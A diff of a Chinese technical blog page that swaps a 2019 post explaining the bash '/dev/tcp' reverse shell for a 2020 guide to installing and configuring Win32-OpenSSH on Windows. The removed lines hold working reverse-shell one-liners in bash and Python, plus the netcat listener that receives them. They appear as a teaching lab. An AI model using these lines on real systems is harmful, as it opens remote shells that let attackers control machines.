@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Linux,bash,shell," />
+  <meta name="keywords" content="OpenSSH," />
 
 
 
@@ -81,15 +81,15 @@
 
 
 
-<meta name="description" content="1. 什么是&#x2F;dev&#x2F;tcp&#x2F; &#x2F;dev&#x2F;udp类似 &#x2F;dev&#x2F;tcp&#x2F;host&#x2F;port   &#x2F;dev&#x2F;udp&#x2F;host&#x2F;port  这种形式实际上属于bash的一个特性,类似一种固定的格式调用底层函数打开一个socket,在其他的 shell 中并不一定用(ksh 有这种写法)。这是一个特殊的文件实际上在 dev 目录下是不存在的。利用它我们可以创建 TCP&#x2F;UDP 的连接。这里我们举一个例子">
-<meta name="keywords" content="Linux,bash,shell">
+<meta name="description" content="微软官方的解决方案： 基于PowerShell的OpenSSH：https:&#x2F;&#x2F;github.com&#x2F;PowerShell&#x2F;Win32-OpenSSH&#x2F;releases 详细说明可以参考Github的Wiki，这里简单说下安装步骤： 安装步骤：1、进入链接下载最新 OpenSSH-Win64.zip（64位系统），解压至C:\Program Files\OpenSSH 2、打开cmd，cd进入C:">
+<meta name="keywords" content="OpenSSH">
 <meta property="og:type" content="article">
-<meta property="og:title" content="bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;localhost&#x2F;8080 0&gt;&amp;1 的含义">
-<meta property="og:url" content="https:&#x2F;&#x2F;becivells.github.io&#x2F;2019&#x2F;01&#x2F;bash_i_dev_tcp&#x2F;index.html">
+<meta property="og:title" content="win-openssh">
+<meta property="og:url" content="https:&#x2F;&#x2F;becivells.github.io&#x2F;2020&#x2F;03&#x2F;win-openssh&#x2F;index.html">
 <meta property="og:site_name" content="Becivells 的 Blog">
-<meta property="og:description" content="1. 什么是&#x2F;dev&#x2F;tcp&#x2F; &#x2F;dev&#x2F;udp类似 &#x2F;dev&#x2F;tcp&#x2F;host&#x2F;port   &#x2F;dev&#x2F;udp&#x2F;host&#x2F;port  这种形式实际上属于bash的一个特性,类似一种固定的格式调用底层函数打开一个socket,在其他的 shell 中并不一定用(ksh 有这种写法)。这是一个特殊的文件实际上在 dev 目录下是不存在的。利用它我们可以创建 TCP&#x2F;UDP 的连接。这里我们举一个例子">
+<meta property="og:description" content="微软官方的解决方案： 基于PowerShell的OpenSSH：https:&#x2F;&#x2F;github.com&#x2F;PowerShell&#x2F;Win32-OpenSSH&#x2F;releases 详细说明可以参考Github的Wiki，这里简单说下安装步骤： 安装步骤：1、进入链接下载最新 OpenSSH-Win64.zip（64位系统），解压至C:\Program Files\OpenSSH 2、打开cmd，cd进入C:">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-12-05T05:11:18.627Z">
+<meta property="og:updated_time" content="2020-03-24T01:47:36.906Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="https://becivells.github.io/2019/01/bash_i_dev_tcp/"/>
+  <link rel="canonical" href="https://becivells.github.io/2020/03/win-openssh/"/>
 
 
 
 
 
-  <title>bash -i >& /dev/tcp/localhost/8080 0>&1 的含义 | Becivells 的 Blog</title>
+  <title>win-openssh | Becivells 的 Blog</title>
   
 
 
@@ -307,7 +307,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://becivells.github.io/2019/01/bash_i_dev_tcp/">
+    <link itemprop="mainEntityOfPage" href="https://becivells.github.io/2020/03/win-openssh/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Becivells">
@@ -324,7 +324,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">bash -i >& /dev/tcp/localhost/8080 0>&1 的含义</h1>
+          <h1 class="post-title" itemprop="name headline">win-openssh</h1>
         
 
         <div class="post-meta">
@@ -336,8 +336,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-03T20:37:04+08:00">
-                2019-01-03
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-10T20:37:04+08:00">
+                2020-03-10
               </time>
             
 
@@ -359,8 +359,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Linux/" itemprop="url" rel="index">
-                    <span itemprop="name">Linux</span>
+                  <a href="/categories/Install/" itemprop="url" rel="index">
+                    <span itemprop="name">Install</span>
                   </a>
                 </span>
 
@@ -390,7 +390,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.1k
+                  390
                 </span>
               
 
@@ -406,7 +406,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  5
+                  1
                 </span>
               
             </div>
@@ -427,49 +427,33 @@
       
 
       
-        <h2 id="1-什么是-dev-tcp-dev-udp"><a href="#1-什么是-dev-tcp-dev-udp" class="headerlink" title="1. 什么是/dev/tcp/ /dev/udp"></a>1. 什么是<code>/dev/tcp/</code> <code>/dev/udp</code></h2><p>类似 <code>/dev/tcp/host/port</code>   <code>/dev/udp/host/port</code>  这种形式实际上属于bash的一个特性,类似一种固定的格式调用底层函数打开一个socket,在其他的 shell 中并不一定用(ksh 有这种写法)。这是一个特殊的文件实际上在 dev 目录下是不存在的。利用它我们可以创建 TCP/UDP 的连接。这里我们举一个例子</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">exec 9&lt;&gt;/dev/tcp/www.hactcm.edu.cn/80   # 打开一个文件描述符 9 并且绑定一个 socket</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">echo -e  "GET / HTTP/1.1/n/n" &gt;&amp;9       # 像 9 中发送一个字符串</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">cat &lt;&amp;9                                 # 取出 9 中收到的字符串</span></pre></td></tr></table></figure>
-<p>结果是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 400 Bad Request</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Content-Type: text&#x2F;html</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Content-Length: 7083</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">.........</span></pre></td></tr></table></figure>
-<p>我们还可以从 <code>/dev/fd/</code>  中看到文件描述符9指向一个socket</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">[root@master ~]# ls -lah /dev/fd/</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">总用量 0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">dr-x------ 2 root root  0 1月   3 21:10 .</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">dr-xr-xr-x 9 root root  0 1月   3 21:10 ..</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">lrwx------ 1 root root 64 1月   3 21:10 0 -&gt; /dev/pts/0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">lrwx------ 1 root root 64 1月   3 21:10 1 -&gt; /dev/pts/0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">lrwx------ 1 root root 64 1月   3 21:10 2 -&gt; /dev/pts/0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">lr-x------ 1 root root 64 1月   3 21:10 3 -&gt; /proc/7597/fd</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">lrwx------ 1 root root 64 1月   3 21:10 9 -&gt; socket:[34195773]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">[root@master ~]#</span></pre></td></tr></table></figure>
-<p>最后别忘记释放链接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">exec &gt;&amp;9-</span></pre></td></tr></table></figure>
-<p>理解了 <code>/dev/tcp/host/port</code>  的含义我们看一看</p>
-<h2 id="2-理解bash-i-gt-amp-dev-tcp-localhost-8080-0-gt-amp-1"><a href="#2-理解bash-i-gt-amp-dev-tcp-localhost-8080-0-gt-amp-1" class="headerlink" title="2. 理解bash -i &gt;&amp; /dev/tcp/localhost/8080 0&gt;&amp;1"></a>2. 理解<code>bash -i &gt;&amp; /dev/tcp/localhost/8080 0&gt;&amp;1</code></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;localhost&#x2F;8080 0&gt;&amp;1</span></pre></td></tr></table></figure>
-<p>这是一个常用的反弹 shell 的命令。常用于把内网的机器反弹到外网机器上从而实现 外网主机控制内网主机。</p>
-<ul>
-<li><p><code>bash -i</code> 打开一个交互式的shell</p>
-</li>
-<li><p><code>&gt;&amp;</code>  这个命令和 <code>&amp;&gt;</code> 是一样的而且我推荐大家使用 <code>&amp;&gt;</code> 。这两个符号的含义是把标准错误和标准输出重定向到文件。举个例子大家可以执行以下看一下结果</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">ls -la &gt; aaa.log    # 标准输出重定向到文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">cat aaa.log         # 查看结果</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">lss -la &gt; aaa.log   # 标准错误未重定向到文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">cat aaa.log         # 查看结果</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">lss -la &amp;&gt; aaa.log  # 标准错误和标准输出未重定向到文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">cat aaa.log </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">lss -la &gt;&amp; aaa.log  # 标准错误和标准输出未重定向到文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">cat aaa.log         # 查看结果</span></pre></td></tr></table></figure>
-<p>对于这个<code>&gt;&amp;</code>  <code>&amp;&gt;</code> 的解释可以看<a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Redirecting-Standard-Output-and-Standard-Error" target="_blank" rel="noopener">bash的手册</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">This construct allows both the standard output (file descriptor 1) and the standard error output (file descriptor 2) to be redirected to the file whose name is the expansion of word.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">There are two formats for redirecting standard output and standard error:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&amp;&gt;word</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">and</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&gt;&amp;word</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">Of the two forms, the first is preferred. This is semantically equivalent to</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&gt;word 2&gt;&amp;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">When using the second form, word may not expand to a number or ‘-’. If it does, other redirection operators apply (see Duplicating File Descriptors below) for compatibility reasons.</span></pre></td></tr></table></figure>
-<p><strong>一句话说就是这两个符号代表的含义是一样的</strong></p>
-</li>
-<li><p><code>0&gt;&amp;1</code> 把输入重定向到标准输出</p>
-</li>
-</ul>
-<p><strong>这样外网的机器就可以获得一个完整的 shell </strong>,有兴趣的大家可以试一下</p>
-<h2 id="3-实验"><a href="#3-实验" class="headerlink" title="3. 实验"></a>3. 实验</h2><p>外网机器执行 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">nc -lvp 8787</span></pre></td></tr></table></figure>
-<p>内网机器执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;外网机器IP&#x2F;8787 0&gt;&amp;1</span></pre></td></tr></table></figure>
-<p>当然在 bash 下执行是没问题的但是在其他 shell 下执行会报错所以更健壮的写法是 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;外网机器IP&#x2F;8787 0&gt;&amp;1&#39;</span></pre></td></tr></table></figure>
-<p>实际上还可以这样写</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">bash -c &#39;bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;外网机器IP&#x2F;8787 &lt;&amp;1&#39;</span></pre></td></tr></table></figure>
-<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h2><p>网上传的很多语言的脚本也是利用这个原理,反弹一个shell让我们控制，看下利用的条件 </p>
-<ul>
-<li>支持 tcp 链接</li>
-<li>支持 IO 重定向</li>
-<li>可以调用系统命令</li>
-</ul>
-<p>只要满足这三个你熟知的语言都可以替换掉这行命令</p>
-<p>下面贴一个Python的反弹shell</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("XXX.XXX.XXX.XXX",8787));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">s.connect((<span class="string">"外网机器IP"</span>,<span class="number">8787</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">p=subprocess.call([<span class="string">"/bin/bash"</span>,<span class="string">"-i"</span>])</span></pre></td></tr></table></figure>
-<h2 id="5-致谢"><a href="#5-致谢" class="headerlink" title="5. 致谢"></a>5. 致谢</h2><p>谢谢小明同学和小陈同学给出的中肯意见。</p>
+        <p>微软官方的解决方案：</p>
+<p>基于PowerShell的OpenSSH：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FPowerShell%2FWin32-OpenSSH%2Freleases" target="_blank" rel="noopener">https://github.com/PowerShell/Win32-OpenSSH/releases</a></p>
+<p>详细说明可以参考Github的Wiki，这里简单说下安装步骤：</p>
+<h1 id="安装步骤："><a href="#安装步骤：" class="headerlink" title="安装步骤："></a>安装步骤：</h1><p>1、进入链接下载最新 OpenSSH-Win64.zip<em>（64位系统）</em>，解压至C:\Program Files\OpenSSH</p>
+<p>2、打开cmd，cd进入C:\Program Files\OpenSSH<em>（安装目录）</em>，执行命令：</p>
+<blockquote>
+<p>powershell.exe -ExecutionPolicy Bypass -File install-sshd.ps1</p>
+</blockquote>
+<p>3、设置服务自动启动并启动服务：</p>
+<blockquote>
+<p>sc config sshd start= auto</p>
+</blockquote>
+<blockquote>
+<p>net start sshd</p>
+</blockquote>
+<p>到此服务已经安装完毕，默认端口一样是22，默认用户名密码为Window账户名和密码，当然防火墙还是要设置对应端口允许通讯</p>
+<h1 id="修改设置："><a href="#修改设置：" class="headerlink" title="修改设置："></a>修改设置：</h1><p>ssh_config文件在<strong>C:\ProgramData\ssh</strong>目录下<em>（此目录为隐藏目录）</em></p>
+<blockquote>
+<p>端口号：Port 22</p>
+<p>密钥访问：PubkeyAuthentication yes</p>
+<p>密码访问：PasswordAuthentication no</p>
+<p>空密码：PermitEmptyPasswords no</p>
+</blockquote>
+<h2 id="密钥登录"><a href="#密钥登录" class="headerlink" title="密钥登录"></a>密钥登录</h2><h3 id="普通用户"><a href="#普通用户" class="headerlink" title="普通用户"></a>普通用户</h3><p>Windows Service即使配置了.ssh/authorized_keys公钥，连接时依然显示没有注册公钥查阅了官方wiki判断可能是权限问题：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FPowerShell%2FWin32-OpenSSH%2Fwiki%2FOpenSSH-utility-scripts-to-fix-file-permissions" target="_blank" rel="noopener">Fix SSH file permissions</a></p>
+<p>进入C:\Program Files\OpenSSH<em>（安装目录），</em>右键 FixHostFilePermissions.ps1【使用PowerShell运行】，命令行提示全选是，重启sshd服务后密钥连接正常</p>
+<p>参考官方wiki：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FPowerShell%2FWin32-OpenSSH%2Fwiki%2FSecurity-protection-of-various-files-in-Win32-OpenSSH%23administrators_authorized_keys" target="_blank" rel="noopener">administrators_authorized_keys</a></p>
+<h3 id="特权账户"><a href="#特权账户" class="headerlink" title="特权账户"></a>特权账户</h3><p>Administrators用户组的用户连接公钥，默认位置为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">C:\ProgramData\ssh\administrators_authorized_keys</span></pre></td></tr></table></figure><br>并且需要设置权限，在CMD中执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">icacls administrators_authorized_keys &#x2F;inheritance:r</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">icacls administrators_authorized_keys &#x2F;grant SYSTEM:(F)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">icacls administrators_authorized_keys &#x2F;grant BUILTIN\Administrators:(F)</span></pre></td></tr></table></figure><br>修改ssh_config文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">AuthorizedKeysFile	%programdata%&#x2F;ssh&#x2F;administrators_authorized_keys</span></pre></td></tr></table></figure><br>设置完成后重启sshd服务，接下来就可以使用了</p>
 
       
     </div>
@@ -487,11 +471,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Linux/" rel="tag"># Linux</a>
-          
-            <a href="/tags/bash/" rel="tag"># bash</a>
-          
-            <a href="/tags/shell/" rel="tag"># shell</a>
+            <a href="/tags/OpenSSH/" rel="tag"># OpenSSH</a>
           
         </div>
       
@@ -504,8 +484,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/prometheus_install/" rel="next" title="Prometheus 安装">
-                <i class="fa fa-chevron-left"></i> Prometheus 安装
+              <a href="/2019/12/xray_gaojing/" rel="next" title="xray 设置钉钉告警">
+                <i class="fa fa-chevron-left"></i> xray 设置钉钉告警
               </a>
             
           </div>
@@ -514,8 +494,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/01/exec_tee_a_i_test_log_subshell/" rel="prev" title="理解 exec &> >(tee -a -i test.log) 之 subshell">
-                理解 exec &> >(tee -a -i test.log) 之 subshell <i class="fa fa-chevron-right"></i>
+              <a href="/2020/03/openstack_Packstack/" rel="prev" title="Packstack - OpenStack 一键安装包">
+                Packstack - OpenStack 一键安装包 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -669,7 +649,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-什么是-dev-tcp-dev-udp"><span class="nav-number">1.</span> <span class="nav-text">1. 什么是/dev/tcp/ /dev/udp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-理解bash-i-gt-amp-dev-tcp-localhost-8080-0-gt-amp-1"><span class="nav-number">2.</span> <span class="nav-text">2. 理解bash -i &gt;&amp; /dev/tcp/localhost/8080 0&gt;&amp;1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-实验"><span class="nav-number">3.</span> <span class="nav-text">3. 实验</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-总结"><span class="nav-number">4.</span> <span class="nav-text">4. 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-致谢"><span class="nav-number">5.</span> <span class="nav-text">5. 致谢</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#安装步骤："><span class="nav-number">1.</span> <span class="nav-text">安装步骤：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#修改设置："><span class="nav-number">2.</span> <span class="nav-text">修改设置：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#密钥登录"><span class="nav-number">2.1.</span> <span class="nav-text">密钥登录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#普通用户"><span class="nav-number">2.1.1.</span> <span class="nav-text">普通用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#特权账户"><span class="nav-number">2.1.2.</span> <span class="nav-text">特权账户</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
